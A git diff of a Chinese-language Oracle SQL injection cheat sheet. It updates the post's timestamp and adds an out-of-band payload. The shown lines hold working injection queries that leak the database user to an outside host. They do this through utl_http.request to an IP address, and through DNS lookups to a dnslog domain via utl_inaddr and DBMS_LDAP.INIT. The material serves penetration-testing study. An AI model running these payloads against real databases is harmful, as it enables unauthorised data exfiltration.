@@ -11,7 +11,7 @@ draft = false
  * @Author: reber
  * @Mail: reber0ask@qq.com
  * @Date: 2019-04-10 10:45:01
- * @LastEditTime: 2019-08-12 11:14:05
+ * @LastEditTime: 2020-01-07 13:35:44
  -->
 ### 0x00 判断数据库类型
 * Oracle有一些自带的表：dual、user_tables
@@ -154,6 +154,11 @@ select * from utest.msg where id=2 and 1=utl_http.request('http://59.108.35.198:
 * dns服务接收结果
 ```
 select * from utest.msg where id=2 and (select utl_inaddr.get_host_address((select user from dual)||'.dnslog.wyb0.com') from dual) is not null;
+```
+
+* dns服务接收结果
+```
+select * from utest.msg where id=2 and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.dnslog.wyb0.com') from dual) is not null;
 ```
 
 <br>
